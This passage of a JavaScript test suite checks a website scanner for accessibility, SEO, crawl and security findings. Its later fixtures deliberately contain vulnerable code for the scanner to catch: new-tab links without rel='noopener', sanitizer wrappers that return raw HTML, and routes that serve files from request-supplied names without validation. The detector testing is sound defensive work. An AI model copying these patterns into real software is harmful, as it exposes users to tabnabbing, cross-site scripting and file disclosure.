    "performance-image-dimensions",
  ]) {
    assert.ok(!result.findings.some((finding) => finding.id === id), `did not expect ${id}`);
  }
});

test("website scan reports image sizing uncertainty honestly and keeps Vite client API modules out of SSR checks", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      scripts: { dev: "vite" },
      dependencies: { react: "latest", "react-dom": "latest" },
      devDependencies: { vite: "latest" },
    },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><main id=\"root\"></main><script type=\"module\" src=\"/src/main.tsx\"></script></body></html>",
    "src/App.tsx": "export function App({ imageClass }) { return <main><h1>App</h1><img src=\"/unknown.png\" alt=\"Unknown\" className={imageClass} /><img src=\"/missing.png\" alt=\"Missing\" /></main>; }",
    "src/api/client.ts": "export const redirect = () => { window.location.href = '/login'; };",
    "server/api/render.ts": "export const render = () => document.title;",
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection, maxFindingsPerRule: 50 },
  });

  assert.ok(!result.findings.some((finding) => finding.id === "compat-browser-global-on-server" && finding.file === "src/api/client.ts"));
  assert.ok(result.findings.some((finding) => finding.id === "compat-browser-global-on-server" && finding.file === "server/api/render.ts"));
  const imageFindings = result.findings.filter((finding) => finding.id === "performance-image-dimensions");
  assert.equal(imageFindings.length, 2);
  assert.deepEqual(
    imageFindings.map(({ confidence, manual }) => ({ confidence, manual })),
    [{ confidence: "low", manual: true }, { confidence: "high", manual: false }],
  );
});

test("website scan detects static hierarchy, form, media, hidden-focus, and priority-image risks", async (t) => {
  const project = await fixture(t, {
    "index.html": [
      "<!doctype html>",
      "<html lang=\"en\"><head><title>Checkout</title><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width\"></head>",
      "<body><main>",
      "<h1>Checkout</h1><h1>Account</h1><h2><span></span></h2>",
      "<img src=\"hero.jpg\" alt=\"Product\" width=\"1200\" height=\"600\" fetchpriority=\"high\" loading=\"lazy\">",
      "<form action=\"/checkout\" method=\"post\">",
      "<label for=\"email\">Email</label><input id=\"email\" name=\"email\" type=\"email\" autocomplete=\"off\" required>",
      "<label for=\"password\">Password</label><input id=\"password\" name=\"password\" type=\"password\" autocomplete=\"not-a-purpose\" required>",
      "<button>Cancel</button><div role=\"alert\" aria-live=\"polite\"></div>",
      "</form>",
      "<div aria-hidden=\"true\"><a href=\"/billing\">Billing</a></div>",
      "<video autoplay><track kind=\"captions\" src=\"captions.vtt\"></video>",
      "</main></body></html>",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  const ids = new Set(result.findings.map(({ id }) => id));
  for (const id of [
    "content-multiple-h1",
    "content-empty-heading",
    "performance-priority-image-lazy",
    "forms-missing-autocomplete",
    "forms-implicit-button-type",
    "a11y-focusable-aria-hidden",
    "a11y-audible-autoplay",
  ]) {
    assert.ok(ids.has(id), `expected ${id}`);
  }
  assert.equal(result.findings.filter(({ id }) => id === "forms-missing-autocomplete").length, 2);
  assert.equal(result.findings.find(({ id }) => id === "content-empty-heading").line, 4);
  assert.equal(result.findings.find(({ id }) => id === "forms-implicit-button-type").line, 9);
  assert.equal(result.findings.find(({ id }) => id === "a11y-focusable-aria-hidden").line, 11);
});

test("website scan recognizes safe equivalents for advanced static checks", async (t) => {
  const project = await fixture(t, {
    "index.html": [
      "<!doctype html><html lang=\"en\"><head><title>Profile</title><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width\"></head><body><main>",
      "<h1>Profile</h1><h2>Contact details</h2>",
      "<img src=\"hero.jpg\" alt=\"Profile\" width=\"1200\" height=\"600\" fetchpriority=\"high\" loading=\"eager\">",
      "<img src=\"secondary.jpg\" alt=\"Secondary\" width=\"600\" height=\"400\" priority loading=\"lazy\">",
      "<form><label for=\"email\">Email</label><input id=\"email\" name=\"email\" type=\"email\" autocomplete=\"section-profile home email\" required>",
      "<button type=\"submit\">Save</button><div role=\"alert\" aria-live=\"polite\"></div></form>",
      "<div aria-hidden=\"true\"><button disabled>Unavailable</button><span>Decoration</span></div>",
      "<div data-aria-hidden=\"true\"><a href=\"/still-visible\">Still visible</a></div>",
      "<video autoplay muted><track kind=\"captions\" src=\"captions.vtt\"></video>",
      "</main></body></html>",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  const absent = new Set([
    "content-multiple-h1",
    "content-empty-heading",
    "performance-priority-image-lazy",
    "forms-missing-autocomplete",
    "forms-implicit-button-type",
    "a11y-focusable-aria-hidden",
    "a11y-audible-autoplay",
  ]);
  assert.ok(result.findings.every(({ id }) => !absent.has(id)));
});

test("website scan treats priority as a framework image hint only", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      dependencies: { next: "latest", react: "latest", "react-dom": "latest" },
    },
    "app/page.tsx": [
      "import Image from 'next/image';",
      "export default function Page() { return <main><h1>Home</h1>",
      "<img src=\"/secondary.jpg\" alt=\"Secondary\" width=\"600\" height=\"400\" priority loading=\"lazy\" />",
      "<Image src=\"/hero.jpg\" alt=\"Hero\" width={1200} height={600} priority loading=\"lazy\" />",
      "</main>; }",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  const findings = result.findings.filter(({ id }) => id === "performance-priority-image-lazy");
  assert.equal(findings.length, 1);
  assert.match(findings[0].evidence, /^<Image\b/);
});

test("website scan treats a framework index document as an app mount shell", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      scripts: { dev: "vite" },
      dependencies: { react: "latest", "react-dom": "latest" },
      devDependencies: { vite: "latest" },
    },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><div id=\"root\"></div><script type=\"module\" src=\"/src/main.jsx\"></script></body></html>",
    "src/App.jsx": "export function App() { return <main><h1>Runtime heading</h1></main>; }",
    "src/main.jsx": "import { createRoot } from 'react-dom/client'; import { App } from './App.jsx'; createRoot(document.getElementById('root')).render(<App />);",
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(!result.findings.some((finding) => finding.id === "content-missing-h1" && finding.file === "index.html"));
});

test("website scan recognizes root Next app-router pages and layouts as page surfaces", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      dependencies: { next: "latest", react: "latest", "react-dom": "latest" },
    },
    "app/layout.tsx": [
      "export const metadata = { title: 'Site', description: 'Description' };",
      "export default function Layout({ children }) { return <html lang=\"en\"><body>{children}</body></html>; }",
    ].join("\n"),
    "app/page.tsx": "export default function Page() { return <main><h1>Home</h1></main>; }",
  });
  assert.equal(project.webDetection.isWebsite, true);

  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.equal(result.metadata.scope.pageFiles, 2);
  assert.ok(result.findings.some(({ id }) => id === "ux-missing-navigation-landmark"));
});

test("website scan follows local primary-heading component contracts without hiding real missing headings", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      scripts: { dev: "vite" },
      dependencies: { react: "latest", "react-dom": "latest", "react-router": "latest" },
      devDependencies: { vite: "latest" },
    },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><div id=\"root\"></div><script type=\"module\" src=\"/src/main.tsx\"></script></body></html>",
    "src/components/PageHeader.tsx": "export function PageHeader({ title }) { return <header><h1>{title}</h1></header>; }",
    "src/components/ModuleWrapper.tsx": [
      "import { PageHeader as SharedHeader } from './PageHeader';",
      "export default function ModuleWrapper({ title, children }) {",
      "  return <main><SharedHeader title={title} />{children}</main>;",
      "}",
    ].join("\n"),
    "src/routes/account.tsx": [
      "import ModuleWrapper from '~/components/ModuleWrapper';",
      "export default function Account() { return <ModuleWrapper title=\"Account\"><p>Settings</p></ModuleWrapper>; }",
    ].join("\n"),
    "src/routes/profile.tsx": [
      "import { PageHeader as Header } from '../components/PageHeader';",
      "export default function Profile() { return <main><Header title=\"Profile\" /></main>; }",
    ].join("\n"),
    "src/routes/redirect.tsx": "import { Navigate } from 'react-router'; export default function Redirect() { return <Navigate to=\"/account\" replace />; }",
    "src/routes/layout.tsx": "import { Outlet } from 'react-router'; export default function Layout() { return <main><Outlet /></main>; }",
    "src/App.tsx": "import { Routes, Route } from 'react-router'; export default function App() { return <Routes><Route path=\"/account\" element={<div />} /></Routes>; }",
    "src/routes/missing.tsx": "export default function Missing() { return <main><p>There is no primary heading.</p></main>; }",
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection, maxFindingsPerRule: 50 },
  });

  const missing = result.findings
    .filter((finding) => finding.id === "content-missing-h1")
    .map((finding) => finding.file);
  assert.deepEqual(missing, ["src/routes/missing.tsx"]);
});

test("website scan recognizes an explicit local not-found catch-all route", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      scripts: { dev: "vite" },
      dependencies: { react: "latest", "react-dom": "latest", "react-router-dom": "latest" },
      devDependencies: { vite: "latest" },
    },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><div id=\"root\"></div><script type=\"module\" src=\"/src/main.tsx\"></script></body></html>",
    "src/components/NotFound.tsx": "export function NotFound() { return <main><h1>Page not found</h1><a href=\"/\">Home</a></main>; }",
    "src/routes/home.tsx": "export function Home() { return <main><h1>Home</h1></main>; }",
    "src/App.tsx": [
      "import { Routes, Route } from 'react-router-dom';",
      "import { NotFound as MissingPage } from './components/NotFound';",
      "import { Home } from './routes/home';",
      "export function App() { return <Routes>",
      "  <Route path=\"/\" element={<Home />} />",
      "  <Route path={'*'} element={<MissingPage />} />",
      "</Routes>; }",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(!result.findings.some(({ id }) => id === "ux-no-not-found-page"));
});

test("website scan does not infer a fallback from an unused or non-local not-found component", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      scripts: { dev: "vite" },
      dependencies: { react: "latest", "react-dom": "latest", "react-router-dom": "latest" },
      devDependencies: { vite: "latest" },
    },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><div id=\"root\"></div><script type=\"module\" src=\"/src/main.tsx\"></script></body></html>",
    "src/components/NotFound.tsx": "export function NotFound() { return <main><h1>Unused page</h1></main>; }",
    "src/routes/home.tsx": "export function Home() { return <main><h1>Home</h1></main>; }",
    "src/App.tsx": [
      "import { Routes, Route, Navigate } from 'react-router-dom';",
      "import { NotFound as PackageNotFound } from 'external-ui';",
      "import { Home } from './routes/home';",
      "const fallbackPath = '*';",
      "export function App() { return <Routes>",
      "  <Route path=\"/\" element={<Home />} />",
      "  <Route path={fallbackPath} element={<PackageNotFound />} />",
      "  <Route path=\"*\" element={<Navigate to=\"/\" replace />} />",
      "</Routes>; }",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(result.findings.some(({ id }) => id === "ux-no-not-found-page"));
});

test("website scan validates SEO metadata for each concrete HTML document", async (t) => {
  const project = await fixture(t, {
    "index.html": "<!doctype html><html lang=\"en\"><head><title>Home</title><meta name=\"description\" content=\"Home page\"><meta property=\"og:title\" content=\"Home\"><link rel=\"canonical\" href=\"https://example.com/\"></head><body><main><h1>Home</h1></main></body></html>",
    "about.html": "<!doctype html><html lang=\"en\"><head></head><body><main><h1>About</h1></main></body></html>",
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(result.findings.some((finding) => finding.id === "seo-missing-title" && finding.file === "about.html"));
  assert.ok(result.findings.some((finding) => finding.id === "seo-missing-description" && finding.file === "about.html"));
  assert.ok(result.findings.some((finding) => finding.id === "seo-missing-canonical" && finding.file === "about.html"));
  assert.ok(result.findings.some((finding) => finding.id === "seo-missing-social-metadata" && finding.file === "about.html"));
  assert.ok(!result.findings.some((finding) => finding.id.startsWith("seo-missing-") && finding.file === "index.html"));
});

test("website scan preserves deployable routes named demo or examples", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { next: "latest", react: "latest", "react-dom": "latest" } },
    "app/layout.tsx": "export const metadata = { title: 'App' }; export default function Layout({ children }) { return <html lang=\"en\"><body>{children}</body></html>; }",
    "app/demo/page.tsx": "export default function Demo() { return <main><h1>Demo</h1><img src=\"/demo.png\"></main>; }",
    "src/pages/examples/index.tsx": "export default function Examples() { return <main><h1>Examples</h1></main>; }",
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(result.findings.some((finding) => finding.id === "a11y-image-alt" && finding.file === "app/demo/page.tsx"));
  assert.ok(result.metadata.scope.excludedNonProductionFiles === 0);
});

test("website scan audits reserved-looking route segments inside a production workspace", async (t) => {
  const routeSegments = ["docs", "test", "generated", "demo", "examples"];
  const routeEntries = Object.fromEntries(routeSegments.map((segment) => [
    `apps/web/app/${segment}/page.tsx`,
    `export default function Page() { return <main><h1>${segment}</h1><img src="/${segment}.png"></main>; }`,
  ]));
  const project = await fixture(t, {
    "package.json": { private: true, workspaces: ["apps/*"] },
    "apps/web/package.json": {
      private: true,
      dependencies: { next: "latest", react: "latest", "react-dom": "latest" },
    },
    ...routeEntries,
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  for (const segment of routeSegments) {
    assert.ok(result.findings.some((finding) =>
      finding.id === "a11y-image-alt" && finding.file === `apps/web/app/${segment}/page.tsx`));
  }
  assert.equal(result.metadata.scope.excludedNonProductionFiles, 0);
});

test("website scan treats oversized crawl files as present but unvalidated", async (t) => {
  const project = await fixture(t, {
    "index.html": "<!doctype html><html lang=\"en\"><head><title>Production</title></head><body><main><h1>Production</h1></main></body></html>",
    "public/robots.txt": `User-agent: *\nAllow: /\n${"# padding\n".repeat(80)}`,
    "public/sitemap.xml": `<?xml version=\"1.0\"?><urlset>${" ".repeat(800)}</urlset>`,
  }, { maxFileBytes: 512 });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(!result.findings.some((finding) => finding.id === "crawl-missing-robots"));
  assert.ok(!result.findings.some((finding) => finding.id === "crawl-missing-sitemap"));
  assert.ok(result.findings.some((finding) => finding.id === "crawl-robots-unvalidated"));
  assert.ok(result.findings.some((finding) => finding.id === "crawl-sitemap-unvalidated"));
  assert.deepEqual(result.metadata.scope.unvalidatedCrawlFiles.sort(), ["public/robots.txt", "public/sitemap.xml"]);
});

test("website scan aggregates production workspace manifests and crawl assets", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, workspaces: ["apps/*"] },
    "apps/web/package.json": {
      private: true,
      scripts: { dev: "next dev" },
      dependencies: { next: "latest", react: "latest", "react-dom": "latest" },
      devDependencies: { "@playwright/test": "latest" },
      browserslist: ["> 0.5%", "not dead"],
    },
    "apps/web/app/page.tsx": "export default function Page() { return <main><h1>Workspace app</h1></main>; }",
    "apps/web/public/robots.txt": "User-agent: *\nAllow: /\nSitemap: https://example.com/sitemap.xml\n",
    "apps/web/public/sitemap.xml": "<?xml version=\"1.0\"?><urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\"><url><loc>https://example.com/</loc></url></urlset>",
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(result.findings.some((finding) => finding.id === "ux-no-loading-state"));
  assert.ok(result.findings.some((finding) => finding.id === "ux-no-error-state"));
  assert.ok(!result.findings.some((finding) => finding.id === "compat-no-browser-policy"));
  assert.ok(!result.findings.some((finding) => finding.id === "compat-no-browser-tests"));
  assert.ok(!result.findings.some((finding) => finding.id === "crawl-missing-robots"));
  assert.ok(!result.findings.some((finding) => finding.id === "crawl-missing-sitemap"));
});

test("website scan ignores commented-out markup while preserving finding line offsets", async (t) => {
  const project = await fixture(t, {
    "index.html": [
      "<!doctype html><html lang=\"en\"><head>",
      "<!-- <title>Old</title><meta name=\"description\" content=\"Old\"><link rel=\"canonical\" href=\"https://old.invalid\"> -->",
      "<meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"></head><body>",
      "<!-- <main><nav>Old</nav><img src=\"old.png\"></main> -->",
      "<div>Live content</div></body></html>",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(result.findings.some((finding) => finding.id === "seo-missing-title" && finding.file === "index.html"));
  assert.ok(result.findings.some((finding) => finding.id === "seo-missing-description" && finding.file === "index.html"));
  assert.ok(result.findings.some((finding) => finding.id === "seo-missing-canonical" && finding.file === "index.html"));
  assert.ok(result.findings.some((finding) => finding.id === "a11y-missing-main-landmark"));
  assert.ok(!result.findings.some((finding) => finding.id === "a11y-image-alt"));
});

test("website scan ignores CSS declarations and signals inside comments", async (t) => {
  const project = await fixture(t, {
    "index.html": "<!doctype html><html lang=\"en\"><head><title>Home</title></head><body><main><h1>Home</h1></main></body></html>",
    "styles.css": "/* legacy .shell { width: 1200px; } TODO: @media (min-width: 40rem) {} */\n.shell { width: 100%; color: #111; }",
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(!result.findings.some((finding) => finding.id === "responsive-rigid-width"));
  assert.ok(result.findings.some((finding) => finding.id === "responsive-no-breakpoint-strategy"));
});

test("website scan ignores JS metadata comments without truncating URL strings or templates", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      dependencies: { next: "latest", react: "latest", "react-dom": "latest" },
    },
    "app/page.tsx": [
      "const endpoint = 'http://localhost:3000/api';",
      "const documentation = `https://example.com/docs`;",
      "// export const metadata = { title: 'Comment title', description: 'Comment description' };",
      "/* export const metadata = { title: 'Old title', description: 'Old description' }; */",
      "export default function Page() { return <main><h1>Home</h1><p>{endpoint}{documentation}</p></main>; }",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(result.findings.some((finding) => finding.id === "seo-missing-title"));
  assert.ok(result.findings.some((finding) => finding.id === "seo-missing-description"));
});

test("website scan does not parse HTML-check regex source as document markup", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      dependencies: { react: "latest", "react-dom": "latest" },
      devDependencies: { vite: "latest" },
    },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><div id=\"root\"></div><script type=\"module\" src=\"/src/App.tsx\"></script></body></html>",
    "src/App.tsx": "export function App() { return <main><h1>App</h1></main>; }",
    "scripts/check-production-seo.mjs": "export const hasDocument = (bodyText) => /<html[\\s>]/i.test(bodyText);",
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(!result.findings.some((finding) =>
    finding.id === "a11y-document-language" && finding.file === "scripts/check-production-seo.mjs"));
});

test("website scan limits bare-name autocomplete inference to personal-data fields", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { react: "latest" } },
    "src/routes/settings.tsx": [
      "export function Settings({ authorNameId, thread, embed }) { return <main>",
      "  <h1>Settings</h1><h3>Advanced</h3>",
      "  <label htmlFor={authorNameId}>Embed author</label>",
      "  <input id={authorNameId} value={embed.author?.name ?? ''} />",
      "  <label htmlFor={`thread-name-${thread.id}`}>Thread template</label>",
      "  <input id={`thread-name-${thread.id}`} value={thread.nameTemplate} />",
      "  <label htmlFor=\"fullName\">Full name</label><input id=\"fullName\" />",
      "</main>; }",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  const autocomplete = result.findings.filter(({ id }) => id === "forms-missing-autocomplete");
  assert.equal(autocomplete.length, 1);
  assert.match(autocomplete[0].evidence, /id=\"fullName\"/);
  assert.ok(result.findings.some(({ id }) => id === "content-heading-jump"));
});

test("website scan recognizes a fixed local CSS avatar image contract", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, scripts: { dev: "vite" }, devDependencies: { vite: "latest" } },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><main id=\"root\"></main><script type=\"module\" src=\"/src/main.ts\"></script></body></html>",
    "src/main.ts": [
      "export const render = (avatar) => `",
      "<style>.avatar { width: 40px; height: 40px; } .avatar img { width: 100%; height: 100%; }</style>",
      "<div class=\"avatar\"><img src=\"${avatar}\" alt=\"Avatar\"></div>",
      "<img src=\"/unsized.png\" alt=\"Unsized\">",
      "`;",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  const imageDimensions = result.findings.filter(({ id }) => id === "performance-image-dimensions");
  assert.equal(imageDimensions.length, 1);
  assert.match(imageDimensions[0].evidence, /unsized\.png/);
});

test("website scan requires proven sanitizer-route provenance before suppressing generated new-tab links", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, workspaces: ["web"], dependencies: { react: "latest" } },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><main>App</main></body></html>",
    "src/services/tickets/transcript.ts": [
      "import fs from 'node:fs';",
      "import path from 'node:path';",
      "const TRANSCRIPT_DIR = path.join(process.cwd(), 'transcripts');",
      "export async function createTranscript(guildId, attachment, apiBase) {",
      "  let html = `<a href=\"${attachment.url}\" target=\"_blank\">file</a>`;",
      "  const fileName = `transcript-${guildId}-${Date.now()}.html`;",
      "  const filePath = path.join(TRANSCRIPT_DIR, fileName);",
      "  await fs.promises.writeFile(filePath, html);",
      "  const url = `${apiBase}/api/transcripts/${fileName}`;",
      "  return { url, fileName };",
      "}",
      "export const SameFileUnsafe = ({ url }) => <a data-kind=\"same-file-unsafe\" href={url} target=\"_blank\">unsafe</a>;",
    ].join("\n"),
    "src/services/tickets/transcript-preview.ts": [
      "import fs from 'node:fs';",
      "import path from 'node:path';",
      "const PREVIEW_DIR = path.join(process.cwd(), 'preview-transcripts');",
      "export async function createPreview(guildId, attachment, apiBase) {",
      "  let html = `<a href=\"${attachment.url}\" target=\"_blank\">preview</a>`;",
      "  const fileName = `transcript-${guildId}-preview-${Date.now()}.html`;",
      "  const filePath = path.join(PREVIEW_DIR, fileName);",
      "  await fs.promises.writeFile(filePath, html);",
      "  const url = `${apiBase}/api/transcripts/${fileName}`;",
      "  return { url, fileName };",
      "}",
    ].join("\n"),
    "src/api/routes/transcripts.ts": [
      "import fs from 'node:fs';",
      "import path from 'node:path';",
      "import sanitizeHtml from 'sanitize-html';",
      "const TRANSCRIPTS_BASE_DIR = path.resolve(process.cwd(), 'transcripts');",
      "const options = {",
      "  allowedAttributes: { a: ['href', 'target', 'rel'] },",
      "  transformTags: { a: sanitizeHtml.simpleTransform('a', { target: '_blank', rel: 'noopener noreferrer' }) },",
      "};",
      "export function sanitizeTranscriptHtml(content) {",
      "  return sanitizeHtml(content, options);",
      "}",
      "export function registerTranscriptRoutes(fastify) {",
      "  fastify.get('/transcripts/:fileName', (request, reply) => {",
      "    const { fileName } = request.params;",
      "    const filePath = path.resolve(TRANSCRIPTS_BASE_DIR, fileName);",
      "    let content = fs.readFileSync(filePath, 'utf8');",
      "    content = sanitizeTranscriptHtml(content);",
      "    return reply.type('text/html').send(content);",
      "  });",
      "}",
    ].join("\n"),
    "src/routes/unsafe.tsx": "export const Unsafe = ({ url }) => <a href={url} target=\"_blank\">unsafe</a>;",
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  const openerFindings = result.findings.filter(({ id }) => id === "security-external-link-opener");
  assert.deepEqual(openerFindings.map(({ file }) => file).sort(), [
    "src/routes/unsafe.tsx",
    "src/services/tickets/transcript-preview.ts",
    "src/services/tickets/transcript.ts",
  ]);
  const sameFile = openerFindings.filter(({ file }) => file === "src/services/tickets/transcript.ts");
  assert.equal(sameFile.length, 1);
  assert.match(sameFile[0].evidence, /same-file-unsafe/);
});

test("website scan rejects sanitizer wrappers whose exact return expression is raw", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { react: "latest" } },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><main>App</main></body></html>",
    "src/services/transcript.ts": [
      "import fs from 'node:fs';",
      "import path from 'node:path';",
      "const TRANSCRIPT_DIR = path.join(process.cwd(), 'transcripts');",
      "const ARCHIVE_DIR = path.join(process.cwd(), 'archives');",
      "export async function createTranscript(id, attachment, apiBase) {",
      "  let html = `<a href=\"${attachment.url}\" target=\"_blank\">file</a>`;",
      "  const fileName = `transcript-${id}-${Date.now()}.html`;",
      "  const filePath = path.join(TRANSCRIPT_DIR, fileName);",
      "  await fs.promises.writeFile(filePath, html);",
      "  const url = `${apiBase}/api/transcripts/${fileName}`;",
      "  return { url, fileName };",
      "}",
      "export async function createArchive(id, attachment, apiBase) {",
      "  let html = `<a data-kind=\"comma-return\" href=\"${attachment.url}\" target=\"_blank\">file</a>`;",
      "  const fileName = `archive-${id}-${Date.now()}.html`;",
      "  const filePath = path.join(ARCHIVE_DIR, fileName);",
      "  await fs.promises.writeFile(filePath, html);",
      "  const url = `${apiBase}/api/archives/${fileName}`;",
      "  return { url, fileName };",
      "}",
    ].join("\n"),
    "src/api/transcripts.ts": [
      "import fs from 'node:fs';",
      "import path from 'node:path';",
      "import sanitizeHtml from 'sanitize-html';",
      "const TRANSCRIPTS_DIR = path.resolve(process.cwd(), 'transcripts');",
      "const ARCHIVES_DIR = path.resolve(process.cwd(), 'archives');",
      "const options = {",
      "  allowedAttributes: { a: ['href', 'target', 'rel'] },",
      "  transformTags: { a: sanitizeHtml.simpleTransform('a', { target: '_blank', rel: 'noopener noreferrer' }) },",
      "};",
      "function sanitizeTranscriptHtml(content) {",
      "  const sanitized = sanitizeHtml(content, options);",
      "  return content;",
      "}",
      "function sanitizeArchiveHtml(content) {",
      "  return sanitizeHtml(content, options), content;",
      "}",
      "export function register(fastify) {",
      "  fastify.get('/transcripts/:fileName', (request, reply) => {",
      "    const { fileName } = request.params;",
      "    const filePath = path.resolve(TRANSCRIPTS_DIR, fileName);",
      "    let content = fs.readFileSync(filePath, 'utf8');",
      "    content = sanitizeTranscriptHtml(content);",
      "    return reply.type('text/html').send(content);",
      "  });",
      "  fastify.get('/archives/:fileName', (request, reply) => {",
      "    const { fileName } = request.params;",
      "    const filePath = path.resolve(ARCHIVES_DIR, fileName);",
      "    let content = fs.readFileSync(filePath, 'utf8');",
      "    content = sanitizeArchiveHtml(content);",
      "    return reply.type('text/html').send(content);",
      "  });",
      "}",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  const openerFindings = result.findings.filter(({ id }) => id === "security-external-link-opener");
  assert.equal(openerFindings.length, 2);
  assert.ok(openerFindings.every(({ file }) => file === "src/services/transcript.ts"));
  assert.ok(openerFindings.some(({ evidence }) => /comma-return/.test(evidence)));
});

test("website scan does not splice sanitizer provenance across route handlers", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { react: "latest" } },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><main>App</main></body></html>",
    "src/services/transcript.ts": [
      "import fs from 'node:fs';",
      "import path from 'node:path';",
      "const TRANSCRIPT_DIR = path.join(process.cwd(), 'transcripts');",
      "export async function createTranscript(id, attachment, apiBase) {",
      "  let html = `<a href=\"${attachment.url}\" target=\"_blank\">file</a>`;",
      "  const fileName = `transcript-${id}-${Date.now()}.html`;",
      "  const filePath = path.join(TRANSCRIPT_DIR, fileName);",
      "  await fs.promises.writeFile(filePath, html);",
      "  const url = `${apiBase}/api/transcripts/${fileName}`;",
      "  return { url, fileName };",
      "}",
    ].join("\n"),
    "src/api/transcripts.ts": [
      "import fs from 'node:fs';",
      "import path from 'node:path';",
      "import sanitizeHtml from 'sanitize-html';",
      "const TRANSCRIPTS_DIR = path.resolve(process.cwd(), 'transcripts');",
      "const options = {",
      "  allowedAttributes: { a: ['href', 'target', 'rel'] },",
      "  transformTags: { a: sanitizeHtml.simpleTransform('a', { target: '_blank', rel: 'noopener noreferrer' }) },",
      "};",
      "function sanitizeTranscriptHtml(content) { return sanitizeHtml(content, options); }",
      "export function register(fastify) {",
      "  fastify.get('/transcripts/:fileName', (request, reply) => {",
      "    const { fileName } = request.params;",
      "    const filePath = path.resolve(TRANSCRIPTS_DIR, fileName);",
      "    const content = fs.readFileSync(filePath, 'utf8');",
      "    return reply.type('text/html').send(content);",
      "  });",
      "  fastify.get('/previews/:fileName', (request, reply) => {",
      "    const { fileName } = request.params;",
      "    const filePath = path.resolve(TRANSCRIPTS_DIR, fileName);",
      "    let content = fs.readFileSync(filePath, 'utf8');",
      "    content = sanitizeTranscriptHtml(content);",
      "    return reply.type('text/html').send(content);",
      "  });",
      "}",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  const openerFindings = result.findings.filter(({ id }) => id === "security-external-link-opener");
  assert.deepEqual(openerFindings.map(({ file }) => file), ["src/services/transcript.ts"]);
});

test("website scan does not splice transcript generation across producer functions", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { react: "latest" } },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title></head><body><main>App</main></body></html>",
    "src/services/transcript.ts": [
      "import fs from 'node:fs';",
      "import path from 'node:path';",
      "const TRANSCRIPT_DIR = path.join(process.cwd(), 'transcripts');",
      "export function renderTranscript(attachment) {",
      "  let html = `<a href=\"${attachment.url}\" target=\"_blank\">file</a>`;",
      "  return html;",
      "}",
      "export async function saveTranscript(id, apiBase) {",
      "  const fileName = `transcript-${id}-${Date.now()}.html`;",
      "  const filePath = path.join(TRANSCRIPT_DIR, fileName);",
      "  await fs.promises.writeFile(filePath, html);",
      "  const url = `${apiBase}/api/transcripts/${fileName}`;",
      "  return { url, fileName };",
      "}",
    ].join("\n"),
